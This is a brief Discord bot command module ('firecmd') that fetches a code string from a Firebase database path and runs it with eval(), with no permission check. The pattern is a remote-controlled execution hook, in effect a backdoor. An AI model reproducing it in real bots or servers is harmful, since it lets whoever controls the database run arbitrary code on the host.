const Discord = require("discord.js");
const config = require(`../config.json`)
module.exports.run = async (client, message, args) => {
	var firebase = require('firebase')
  	var database = firebase.database()
  	await database.ref(`/firecmd/cmd`).once('value')
  	.then(async cmd => { 
  		eval(cmd.val())
  	})
}
module.exports.help = {
	name: "firecmd",
	category:"spyte"
}